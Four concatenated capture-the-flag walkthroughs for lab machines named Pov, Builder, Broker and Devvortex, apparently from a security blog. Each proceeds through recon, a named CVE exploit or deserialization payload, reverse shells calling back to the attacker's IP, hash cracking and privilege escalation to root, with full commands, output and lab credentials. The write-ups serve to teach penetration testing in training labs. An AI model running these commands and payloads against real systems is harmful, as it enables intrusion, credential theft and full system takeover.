content:
Initial Recon # We start our scans with nmap.
> sudo nmap -sS -p- --open --min-rate 3000 -Pn -n -vvv 10.10.11.251 -oG nmap PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 > nmap -p80 -sVC 10.10.11.251 -oN Ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: pov.htb |_http-server-header: Microsoft-IIS/10.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Port Service Product Version 80 http Microsoft IIS httpd 10.0 Solo encontramos un puerto, que en este caso es una Web:
Web # We searched the site but found nothing interesting.
Searching Subdomains # We do fuzzing of subdomains:
ffuf -u http://10.10.11.251 -H "Host: FUZZ.pov.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac We found a subdomain called dev.pov.htb:
If we investigate a little the page, we can see that in several parts it mentions ASP.NET, which already makes us clear that the page is made in this.
In the download cv button we can see this:
We send the request to the burpsuite
If we notice in the file parameter is calling the pdf of the CV
Directory Traversal # We can try to see the etc/hosts file.
there is a file called web.config, which may be of interest:
Ysoserial # We are going to generate a payload with the Ysoserial tool which allows us to create them in .NET: https://github.com/pwntester/ysoserial.net
We use the base64 powershell: https://www.revshells.com/
We run this from a windows machine to create the string that we are going to send to the victim machine:
./ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "powershell -e " We insert our payload to the VIEWSTATE parameter, as follows:
I am listening on port 9001:
sudo rlwrap -cAr nc -lvnp 9001 After searching in different machine paths:
Path ---- C:\Users\sfitz\Documents Lateral Movement # we can see an xml file containing the following:
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"> <Obj RefId="0"> <TN RefId="0"> <T>System.Management.Automation.PSCredential</T> <T>System.Object</T> </TN> <ToString>System.Management.Automation.PSCredential</ToString> <Props> <S N="UserName">alaading</S> <SS N="Password"></SS> </Props> </Obj> </Objs> I will use the Import-CliXml PowerShell command to read the file and obtain the password in plain text
$cred = Import-CliXml -Path connection.xml $cred.GetNetworkCredential().Password we bring the runas to the victim machine:
https://github.com/antonioCoco/RunasCs
We create an smb server to pass this file to the victim machine:
sudo impacket-smbserver share -smb2support /tmp/share -user test -password test create a tmp folder in C:\ on the victim machine:
net use n: \\10.10.14.109\share /user:test test copy n:\RunasCs.exe I run the runas:
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.109:4444 we are listening:
rlwrap -cAr nc -lnvp 4444 from the powershell we can see this priv
What is SeDebugPrivilege? # he SeDebugPrivilege in Windows allows a user to perform system-level debugging. In simple terms, with this privilege, a user can:
Access all system processes: Including those that are normally protected and inaccessible, such as operating system processes and critical services.
Modify or terminate protected processes: The user can terminate processes that standard users would not normally be able to stop.
Read and write to the memory of any process: This includes the ability to inject code or make real-time modifications to running processes.
This privilege is very powerful and is usually reserved for system accounts and administrators because it can be used to bypass almost all security measures of the operating system.
Privilege Escalation # We create a file with msfvenom:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.109 LPORT=6969 -f exe -o platanoo.exe We pass the file back to the victim machine:
sudo impacket-smbserver share -smb2support /tmp/share -user test -password test net use n: \\10.10.14.109\share /user:test test copy n:\platanoo.exe we are now listening to the meterpreter:
msfconsole msf6 > use exploit/multi/handler msf6 > set payload windows/x64/meterpreter/reverse_tcp set LHOST tun0 set LPORT 6969 run [*] Started reverse TCP handler on 10.10.14.109:6969 Now we run the .exe on the victim machine:
./platanoo.exe We will migrate to this process
meterpreter > migrate 552 [*] Migrating from 2032 to 552... [*] Migration completed successfully. meterpreter > getuid Server username: NT AUTHORITY\SYSTEM

content:
Initial Recon # We start our scans with nmap.
> sudo nmap 10.10.11.10 -sS -p- --open -n -Pn --min-rate 3000 -vvv -oG ports PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 8080/tcp open http-proxy syn-ack ttl 62 > nmap -p8080,22 10.10.11.10 -sVC PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:De:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 8080/tcp open http Jetty 10.0.18 |_http-title: Dashboard [Jenkins] |_http-server-header: Jetty(10.0.18) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION | http-robots.txt: 1 disallowed entry |_/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We only have 2 ports, let’s see the website.
Web # We look at versions:
> whatweb http://10.10.11.10:8080/ http://10.10.11.10:8080/ [200 OK] Cookies[JSESSIONID.678bd8a0], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.678bd8a0], IP[10.10.11.10], Jenkins[2.441], Jetty[10.0.18], OpenSearch[/opensearch.xml], Script[application/json,text/javascript], Title[Dashboard [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin] Search for the version of Jenkins that we found on the web. Jenkins 4.441 exploit
CVE-2024-23897 - Jenkins Arbitrary File Leak Vulnerability # Download the .jar file of the vulnerable jenkins
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar Here you have more information about this:
https://www.zscaler.com/blogs/security-research/jenkins-arbitrary-file-leak-vulnerability-cve-2024-23897-can-lead-rce
List the /etc/passwd of the victim machine.
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/etc/passwd' Directory Structure for Jenkins # Here i share information about the order of Jenkins directories:
https://medium.com/@knoldus/directory-structure-and-installing-plugins-in-jenkins-3dd62488631c
We look for the username:
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' connect-node "@/var/jenkins_home/users/users.xml" :: Cada lugar tiene su config.xml
Each user tine un config.xml file, let’s see it:
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml" We find a hash in the file:
We cracked it with john:
Login in Jenkins # Let us log in with the credentials found.
Jenkins credentials — jennifer : princess
Privilege Escalation # If we go to the > Manage Jenkins > Credentials > System > Global Crendentials (UNrestricted)
If we inspect above the key, we can see that the ssh key is encrypted.
How to Print Password Encryption Jenkins # We print the key in the Jenkins Console with the following command that we found on this website:
https://stackoverflow.com/questions/25547381/what-password-encryption-jenkins-is-using
println(hudson.util.Secret.fromString("{encrypt hash}")) and now as usual, we save the key and give it permissions
chmod 600 id_rsa ssh -i id_rsa root@10.10.11.10

content:
Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ. Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx, which is similar to the recent Zimbra disclosure and is leveraged to gain root access.
Initial Recon # > ping -c 1 10.10.11.243 PING 10.10.11.243 (10.10.11.243) 56(84) bytes of data. 64 bytes from 10.10.11.243: icmp_seq=1 ttl=63 time=139 ms --- 10.10.11.243 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 139.019/139.019/139.019/0.000 ms we start our scanning with nmap:
> sudo nmap -sC -sV -oA broker 10.10.11.243 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:754a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Error 401 Unauthorized | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ basic realm=ActiveMQRealm |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel In our result we can see 2 ports.
Port Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP nginx 1.18.0 For now we do not try anything through ssh since we do not have valid credentials, So let’s look at the website.
Login # As soon as I entered the website, it asked me for credentials, I tried admin:admin and magically it let me in.
We have a website with activeMQ.
What is activemq? Apache ActiveMQ is an open source message broker written in Java together with a full Java Message Service client. It provides “Enterprise Features” which in this case means fostering the communication from more than one client or server.
If we go to the section that says Manage ActiveMQ broker we can see more information.
Web # CVE-2023-46604 Exploit # We searched for ActiveMQ 5.15.15 exploit CVE and found an interesting exploit:
CVE-2023-46604
we clone this exploit:
> git clone https://github.com/evkl1d/CVE-2023-46604 > cd CVE-2023-46604 We listen on port 6666:
nc -nlvp 6666 and we edit the poc.xml that contains the exploit folder that we cloned. The line you are going to edit needs your IP of the tun0 interface and the port you are listening on, to receive the shell there.
We create a server in python in which the exploit will take the poc.xml to attack the website.
We run the exploit as follows:
> python3 exploit.py -i 10.10.11.243 -u 'http://10.10.14.26/poc.xml' In the -u parameter we put the Python Server that we made previously.
Did you understand what I did? I explain to you Basically, we copied an exploit from github, which is dedicated for this activeMQ Vulnerability.
in the exploit’s usage guide, it tells us that we need to create a python server which we will assign to it when we execute the attack, so that it loads the poc.xml file on the page with our IP and port on which we are already listening for receive our Revshell.
Privilege Escalation # If we put the command sudo -l it shows us this:
> sudo -l Matching Defaults entries for activemq on broker: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User activemq may run the following commands on broker: (ALL : ALL) NOPASSWD: /usr/sbin/nginx Nginx Sudo - Read root flag # sudo -l is used to check the privileges a user has on a Unix or Linux system via the sudo command.
Okay, We can run nginx with sudo privileges without a password, Let’s deep search how we can do that.
After search, i want now to create a configration file but first we need to see nginx.conf from this path /etc/nginx/nginx.conf.
I’ll edit this file from my machine and upload on the box.
user root; worker_processes auto; events { worker_connections 790; } http{ server { listen 9000; location / { root /; } } } To set configuration file use this command.
> sudo nginx -c /tmp/nginx1.conf > ss -ltnp # displays TCP connections with a source port Now we can access root flag.
curl http://localhost:9000/root/root.txt Thanks for reading.

content:
Initial Recon # We start our scanning with nmap:
> sudo nmap 10.10.11.242 -sS --open --min-rate 3000 -p- -n -Pn -oN Nmapscan PORT STATE SERVICE 22/tcp open ssh 80/tcp open http > nmap -p22,80 -sVC 10.10.11.242 -Pn -oN versionScan PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://devvortex.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel we only have 2 open ports, so let’s look at the website
Web # After searching the entire web, i fuzz subdomains:
> gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt Found: dev.devvortex.htb (Status: 200) [Size: 23221 we fond another website:
When seeing the technologies of the web, we try to do fuzzing to find the joomla login panel.
> gobuster dir -u http://dev.devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt /robots.txt (Status: 200) [Size: 764] /README.txt (Status: 200) [Size: 764] /administrator (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/] /api (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/] /api/experiments (Status: 406) [Size: 29] /api/experiments/configurations (Status: 406) [Size: 29] /cache (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/] in the README.txt we see the following:
http://dev.devvortex.htb/README.txt
Here is the version, let’s look for vulnerabilities or exploits.
Search: Joomla 4.2 exploit
CVE-2023-23752 - Exploit # We found an interesting exploit:
Exploit DB - CVE-2023-23752 We download the exploit and install the necessary libraries
> sudo gem install docopt httpx json paint When executing the exploit we have the following results:
ruby exploit.rb http://dev.devvortex.htb CVE-2023-23752 - Manual # We will run the same vulnerability, but manually, to better understand this:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure
curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | ./jq-linux-amd64 | grep -E 'user|password' We also found information that could be useful to us in the same file
CVE-2023-23752 - My Script # I have also created a script for this, so you have more options: https://github.com/mil4ne/CVE-2023-23752-Joomla-v4.2.8/
With these credentials we try to log in to the Joomla panel.
Get shell # once inside, we go to the system section.
Now we just have to edit one of the web or panel files and put php revshell in them, we will use this:
We access the file we edited, to receive the shell to our listening port
nc -nlvp 9001 listening on [any] 9001 ... connect to [10.10.14.145] from (UNKNOWN) [10.10.11.242] 41690 Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 15:47:51 up 4:52, 0 users, load average: 0.57, 0.34, 0.13 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Lateral Movement # Mysql Database # Previously we had seen that there was a mysql database, so we tried to connect:
> mysql -u lewis -p show databases; use joomla; show tables; select * from sd4fg_users After looking at all the contents of the database, we find the following hash of user logan:
logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
Crack Hash # We identify the hash and crack with john
we move to the user logan
> su logan Privilege Escalation # logan@devvortex:~$ sudo -l [sudo] password for logan: Matching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli CVE-2023–1326 - Privilege Escalation - apport-cli 2.26.0 # In this part I am going to show you 2 ways to escalate privileges:
apport-cli Privilege Escalation
we create a sh file and run it with the apport-cli
logan@devvortex:/tmp$ echo 'Hello apport-cli' > exp.sh logan@devvortex:/tmp$ chmod +x exp.sh logan@devvortex:/tmp$ sudo apport-cli -c exp.sh less We select V for the option to view report and when it says ‘:’, we insert the shell !/bin/bash
What would you like to do? Your options are: S: Send report (1.6 KB) V: View report K: Keep report file for sending later or copying to somewhere else I: Cancel and ignore future crashes of this program version C: Cancel Please choose (S/V/K/I/C): V <HERE YOU GET "less" command output type "!/bin/bash"> # id uid=0(root) gid=0(root) groups=0(root)
